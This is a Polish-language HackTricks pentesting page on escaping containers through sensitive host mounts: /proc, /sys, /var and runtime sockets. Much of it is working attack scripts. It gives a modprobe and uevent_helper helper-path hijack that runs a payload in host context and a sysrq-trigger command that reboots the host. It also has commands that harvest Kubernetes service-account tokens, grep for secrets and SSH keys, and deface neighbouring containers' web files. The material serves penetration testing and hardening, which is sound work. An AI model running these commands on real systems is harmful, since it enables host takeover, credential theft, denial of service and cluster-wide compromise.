# Wrażliwe mounty hosta

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Host mounts są jedną z najważniejszych praktycznych powierzchni do container-escape, ponieważ często redukują starannie izolowany widok procesów do bezpośredniej widoczności zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounts takich ścieżek jak `/proc`, `/sys`, `/var`, gniazd runtime, kubelet-managed state lub ścieżek związanych z urządzeniami mogą ujawnić kontrolki jądra, poświadczenia, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.

Ta strona istnieje osobno od indywidualnych stron dotyczących ochrony, ponieważ model nadużycia jest przekrojowy. Zapisalny host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu pokrycia przez AppArmor lub SELinux, i częściowo z powodu tego, która dokładnie ścieżka hosta została ujawniona. Traktowanie tego jako odrębnego tematu ułatwia rozumowanie o powierzchni ataku.

## Ekspozycja `/proc`

procfs zawiera zarówno zwykłe informacje o procesach, jak i wysokiego wpływu interfejsy kontroli jądra. Bind mount taki jak `-v /proc:/host/proc` lub widok kontenera, który ujawnia nieoczekiwane zapisywalne wpisy w proc, może w konsekwencji prowadzić do ujawnienia informacji, denial of service lub bezpośredniego wykonania kodu na hoście.

Wysokowartościowe ścieżki w procfs obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Nadużycie

Zacznij od sprawdzenia, które z wymienionych ważnych wpisów procfs są widoczne lub zapisywalne:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się host code-execution ścieżkami, jeśli są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` są potężnymi źródłami reconnaissance dla kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst procesu, cgroup i filesystem, co może pomóc w odtworzeniu układu host z wnętrza container.

Praktyczna wartość każdej ścieżki jest różna, a traktowanie ich wszystkich tak, jakby miały taki sam wpływ utrudnia triage:

- `/proc/sys/kernel/core_pattern`
Jeśli zapisywalny, jest to jedna z najwyżej-impact ścieżek procfs, ponieważ kernel wykona pipe handler po crash. Container, który może wskazać `core_pattern` na payload zapisany w swoim overlay lub w zamontowanej host ścieżce, często może uzyskać host code execution. Zobacz też [read-only-paths.md](protections/read-only-paths.md) dla dedykowanego przykładu.
- `/proc/sys/kernel/modprobe`
Ta ścieżka kontroluje userspace helper używany przez kernel, gdy musi wywołać logicę ładowania modułów. Jeśli jest zapisywalna z poziomu container i interpretowana w host context, może stać się kolejnym host code-execution primitive. Jest szczególnie interesująca w połączeniu ze sposobem na wywołanie helper path.
- `/proc/sys/vm/panic_on_oom`
Zwykle nie jest to czysty escape primitive, ale może przekształcić memory pressure w host-wide denial-of-service, zamieniając OOM w kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Jeśli registration interface jest zapisywalny, atakujący może zarejestrować handler dla wybranej magic value i uzyskać host-context execution, gdy uruchomiony zostanie pasujący plik.
- `/proc/config.gz`
Przydatne do kernel exploit triage. Pomaga określić, które subsystems, mitigations i opcjonalne kernel features są włączone bez potrzeby dostępu do host package metadata.
- `/proc/sysrq-trigger`
Głównie ścieżka do denial-of-service, ale bardzo poważna. Może natychmiast zrestartować, spowodować panic lub w inny sposób zakłócić działanie host.
- `/proc/kmsg`
Ujawnia kernel ring buffer messages. Przydatne do host fingerprinting, crash analysis i w niektórych środowiskach do leaking informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
Wartościowe, gdy czytelne, ponieważ ujawnia exported kernel symbol information i może pomóc obalić założenia address randomization podczas developowania kernel exploitów.
- `/proc/[pid]/mem`
To bezpośredni interface do pamięci procesu. Jeśli docelowy proces jest osiągalny przy wymaganych ptrace-style warunkach, może pozwolić na odczyt lub modyfikację pamięci innego procesu. Realistyczny wpływ zależy silnie od credentials, `hidepid`, Yama i ptrace restrictions, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
Udostępnia widok typu core-image na pamięć systemu. Plik jest ogromny i niewygodny w użyciu, ale jeśli jest znacząco czytelny, wskazuje na źle odsłoniętą host memory surface.
- `/proc/kmem` i `/proc/mem`
Historycznie wysokiego wpływu surowe interfejsy pamięci. Na wielu nowoczesnych systemach są wyłączone lub silnie ograniczone, ale jeśli są obecne i używalne, powinny być traktowane jako krytyczne findings.
- `/proc/sched_debug`
Leaks informacje o scheduling i task, które mogą ujawnić host process identities nawet gdy inne widoki procesów wyglądają czystsze niż oczekiwano.
- `/proc/[pid]/mountinfo`
Niezwykle przydatne do odtworzenia, gdzie container rzeczywiście znajduje się na host, które ścieżki są overlay-backed i czy zapisywalny mount odpowiada host content czy tylko warstwie container.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Te polecenia są przydatne, ponieważ wiele host-execution tricks wymaga przekształcenia ścieżki wewnątrz container na odpowiadającą jej ścieżkę z perspektywy host.

### Pełny przykład: `modprobe` Helper Path Abuse

Jeśli `/proc/sys/kernel/modprobe` jest zapisywalny z poziomu container i helper path jest interpretowana w host context, można ją przekierować do attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Dokładny wyzwalacz zależy od celu i zachowania jądra, ale ważne jest, że zapisywalna ścieżka helpera może przekierować przyszłe wywołanie helpera jądra na zawartość ścieżki hosta kontrolowanej przez atakującego.

### Pełny przykład: Kernel Recon z `kallsyms`, `kmsg` i `config.gz`

Jeśli celem jest ocena exploitability zamiast natychmiastowego escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Te polecenia pomagają stwierdzić, czy przydatne informacje o symbolach są widoczne, czy ostatnie kernel messages ujawniają interesujący stan oraz które kernel features lub mitigations są skompilowane. Wpływ zwykle nie jest bezpośrednim escape, ale może znacząco skrócić kernel-vulnerability triage.

### Pełny przykład: SysRq — restart hosta

Jeśli `/proc/sysrq-trigger` jest zapisywalny i widoczny z perspektywy hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efekt to natychmiastowe ponowne uruchomienie hosta. To nie jest subtelny przykład, ale wyraźnie pokazuje, że ekspozycja procfs może być znacznie poważniejsza niż ujawnienie informacji.

## `/sys` Ekspozycja

sysfs ujawnia dużą ilość stanu jądra i urządzeń. Niektóre ścieżki sysfs są głównie przydatne do fingerprinting, podczas gdy inne mogą wpływać na wykonywanie helperów, zachowanie urządzeń, konfigurację security-module lub stan firmware.

Najważniejsze ścieżki sysfs obejmują:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na zachowanie zarządzania termicznego i w konsekwencji stabilność hosta w źle wystawionych środowiskach. `/sys/kernel/vmcoreinfo` może leak crash-dump i informacje o układzie jądra, które pomagają w fingerprinting na niskim poziomie hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany dostęp tam może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia bootu wspierane przez firmware, co czyni je znacznie poważniejszymi niż zwykłe pliki konfiguracyjne. `debugfs` pod `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ jest celowo interfejsem skierowanym do developerów z znacznie mniejszymi oczekiwaniami bezpieczeństwa niż utwardzone, produkcyjne API jądra.

Przydatne polecenia do przeglądu tych ścieżek to:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Co czyni te polecenia interesującymi:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inny LSM jest widoczny w sposób, który powinien pozostać wyłącznie na hoście.
- `/sys/kernel/debug` jest często najbardziej alarmującym odkryciem w tej grupie. Jeśli `debugfs` jest zamontowany i czytelny lub zapisywalny, spodziewaj się rozległej powierzchni widocznej dla jądra, której dokładne ryzyko zależy od włączonych debug nodes.
- Ujawnienie zmiennych EFI jest mniej powszechne, ale jeśli występuje, ma duży wpływ, ponieważ dotyczy ustawień wspieranych przez firmware, a nie zwykłych plików czasu wykonywania.
- `/sys/class/thermal` jest głównie istotny dla stabilności hosta i interakcji ze sprzętem, a nie dla neat shell-style escape.
- `/sys/kernel/vmcoreinfo` jest głównie źródłem host-fingerprinting i crash-analysis, przydatnym do zrozumienia niskopoziomowego stanu jądra.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest zapisywalny, jądro może uruchomić program pomocniczy kontrolowany przez atakującego, gdy zostanie wywołany `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Powodem, dla którego to działa, jest to, że ścieżka helpera jest interpretowana z perspektywy hosta. Po jej wywołaniu helper uruchamia się w kontekście hosta, a nie wewnątrz bieżącego kontenera.

## `/var` Ekspozycja

Podmontowanie hostowego `/var` do kontenera jest często niedoceniane, ponieważ nie wygląda tak dramatycznie jak podmontowanie `/`. W praktyce może to jednak wystarczyć, by uzyskać dostęp do runtime sockets, katalogów snapshotów kontenerów, kubelet-managed pod volumes, projected service-account tokens oraz systemów plików sąsiednich aplikacji. Na nowoczesnych węzłach `/var` często zawiera najbardziej operacyjnie interesujący stan kontenerów.

### Przykład w Kubernetesie

Pod z `hostPath: /var` często może odczytać projected tokens innych podów oraz zawartość overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Te polecenia są przydatne, ponieważ pokazują, czy mount eksponuje tylko nieciekawe dane aplikacji, czy też poświadczenia klastra o dużym znaczeniu. Czytelny service-account token może natychmiast zamienić lokalne wykonanie kodu w dostęp do Kubernetes API.

Jeśli token jest obecny, zweryfikuj, do czego może mieć dostęp, zamiast zatrzymywać się na wykryciu tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Skutki mogą być tu znacznie większe niż dostęp do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zamienić zamontowany `/var` w kompromitację obejmującą cały klaster.

### Docker i containerd — przykład

Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na węzłach Kubernetes z containerd mogą być pod `/var/lib/containerd` lub w ścieżkach specyficznych dla snapshottera:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Jeśli zamontowany `/var` ujawnia zapisywalną zawartość snapshotu innego workloadu, atakujący może zmodyfikować pliki aplikacji, wstawić web content lub zmienić skrypty startowe bez ingerencji w bieżącą konfigurację containera.

Konkretne pomysły na nadużycie po znalezieniu zapisywalnej zawartości snapshotu:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Te polecenia są przydatne, ponieważ pokazują trzy główne rodziny skutków wynikających z zamontowanego `/var`: manipulacja aplikacją, odzyskiwanie sekretów oraz ruch lateralny do sąsiednich workloadów.

## Gniazda czasu wykonania

Wrażliwe host mounts często zawierają runtime sockets zamiast pełnych katalogów. Są one tak istotne, że zasługują na wyraźne powtórzenie tutaj:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dla pełnych scenariuszy eksploatacji, gdy jeden z tych socketów zostanie zamontowany.

Jako szybki wzorzec pierwszej interakcji:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Jeśli którykolwiek z nich się powiedzie, ścieżka od "mounted socket" do "start a more privileged sibling container" jest zwykle znacznie krótsza niż jakakolwiek ścieżka kernel breakout.

## Mount-Related CVEs

Montaże hosta także przecinają się z podatnościami runtime. Ważne, niedawne przykłady obejmują:

- `CVE-2024-21626` w `runc`, gdzie leaked deskryptor pliku katalogu mógł umieścić katalog roboczy na systemie plików hosta.
- `CVE-2024-23651` i `CVE-2024-23653` w BuildKit, gdzie wyścigi copy-up OverlayFS mogły powodować zapisy na ścieżkach hosta podczas buildów.
- `CVE-2024-1753` w Buildah i Podman build flows, gdzie spreparowane bind mounty podczas buildu mogły wystawić `/` z prawami do zapisu i odczytu.
- `CVE-2024-40635` w containerd, gdzie duża wartość `User` mogła przepełnić się tak, że skutkowała zachowaniem UID 0.

Te CVE są istotne tutaj, ponieważ pokazują, że obsługa mountów to nie tylko konfiguracja operatora. Sam runtime może też wprowadzać warunki ucieczki związane z mountami.

## Checks

Użyj tych poleceń, aby szybko zlokalizować narażenia mountów o najwyższej wartości:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- root hosta, `/proc`, `/sys`, `/var` i gniazda runtime to wszystkie znaleziska o wysokim priorytecie.
- Zapisywalne wpisy w `/proc` i `/sys` często oznaczają, że punkt montowania ujawnia globalne dla hosta ustawienia jądra, a nie bezpieczny widok kontenera.
- Zamontowane ścieżki `/var` wymagają przeglądu poświadczeń i przeglądu sąsiednich workloadów, nie tylko przeglądu systemu plików.
